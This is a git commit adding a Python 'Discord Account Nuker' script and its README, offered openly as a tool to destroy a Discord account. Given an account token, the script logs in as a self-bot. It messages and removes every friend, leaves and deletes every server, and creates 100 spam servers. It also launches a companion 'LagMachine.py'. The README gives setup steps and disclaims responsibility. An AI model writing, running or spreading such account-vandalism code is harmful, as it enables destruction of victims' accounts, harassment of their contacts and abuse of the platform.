aa972ce849cb68ec00be86d4cc27a8d3d0498fae
Trollyrique <46622631+Trollyrique@users.noreply.github.com>
2021-08-30 20:32:25 +0000

    Add files via upload

---
+++ AccountNuker.py
@@ -0,0 +1,81 @@
+﻿#  /$$$$$$$$                  /$$ /$$          
+# |__  $$__/                 | $$| $$          
+#   | $$  /$$$$$$   /$$$$$$ | $$| $$ /$$   /$$
+#   | $$ /$$__  $$ /$$__  $$| $$| $$| $$  | $$
+#   | $$| $$  \__/| $$  \ $$| $$| $$| $$  | $$
+#   | $$| $$      | $$  | $$| $$| $$| $$  | $$
+#   | $$| $$      |  $$$$$$/| $$| $$|  $$$$$$$
+#   |__/|__/       \______/ |__/|__/ \____  $$
+#                                   /$$  | $$
+#                                   |  $$$$$$/
+#                                    \______/ 
+#       
+#                       Account Nuker By Trollyrique
+#           https://github.com/Trollyrique/Discord-Account-Nuker
+
+import subprocess
+import config
+from config import *
+import os
+from os import system
+import colorama
+from colorama import init, Fore, Back, Style
+init(convert=True)
+import discord
+from discord.ext import commands
+import requests
+os.system('cls && title Account Nuker By Trollyrique' if os.name == 'nt' else 'clear')
+import random
+client = discord.Client()
+with open('icon.png', 'rb') as f:
+	icon = f.read()
+
+headers = {'Authorization': TOKEN}
+
+@client.event
+async def on_ready():
+	input("Press Enter to start destroying account {0.user}" .format(client))
+	subprocess.Popen('python LagMachine.py')
+	await client.change_presence(activity=discord.Streaming(name="Account Nuker By Trollyrique", url="https://www.twitch.tv/discord"))
+	for user in client.user.friends:
+	  try:
+	    embed=discord.Embed(title="", url="https://github.com/", description="Account Was Destroyed Using Account Nuker By Trollyrique", color=0xff0000)
+	    embed.set_author(name="Account Nuker By Trollyrique", url="https://github.com/Trollyrique/Discord-Account-Nuker")
+	    await user.dm_channel.send(embed=embed)
+	    await user.remove_friend()
+	    print(f"Removed {user}")
+	  except:
+	    pass
+	for guild in client.guilds:
+	  try:
+	    await guild.leave()
+	    print(f"Guild left {guild.name}") 
+	  except:
+	    pass
+	  try:
+	    await guild.delete()
+	    print(f"Guild Delete {guild.name}") 
+	  except:
+	    pass
+	for x in range(100):
+	    await client.create_guild(name="Account Nuker By Trollyrique",  icon=icon)
+	    print(F"Made Guild {guild}")
+	print(Fore.GREEN + "Successfully!")
+
+print(Fore.RED +""
+ /$$$$$$$$                  /$$ /$$          
+|__  $$__/                 | $$| $$          
+   | $$  /$$$$$$   /$$$$$$ | $$| $$ /$$   /$$
+   | $$ /$$__  $$ /$$__  $$| $$| $$| $$  | $$
+   | $$| $$  \__/| $$  \ $$| $$| $$| $$  | $$
+   | $$| $$      | $$  | $$| $$| $$| $$  | $$
+   | $$| $$      |  $$$$$$/| $$| $$|  $$$$$$$
+   |__/|__/       \______/ |__/|__/ \____  $$
+                                    /$$  | $$
+                                   |  $$$$$$/
+                                    \______/ 
+""")
+print(Fore.GREEN + "Account Nuker By Trollyrique" + Fore.YELLOW)
+print(Fore.RED)
+
+client.run(TOKEN, bot=False)
---
+++ README.md
@@ -0,0 +1,17 @@
+# 🔥 Discord Account Nuker 🔥
+Powerful Program to Destroy Discord Account
+
+# 🌟 Features 🌟
+- Sends a Message to All Friends
+- Removes all Friends
+- Removes / Quits from All Guilds
+- Changes Language and Subject Very Quickly
+
+# ⚙️ Instructions ⚙️
+1) Downoload This
+2) Write Token to config.py File
+3) Open AccountNuker.py File with cmd
+
+# ⚠️ Disclaimer ⚠️
+I AM NOT RESPONSIBLE FOR WHAT YOU DO WITH THIS PROGRAM!!!
+EVERYTHING YOU DO - DO AT YOUR OWN RISK
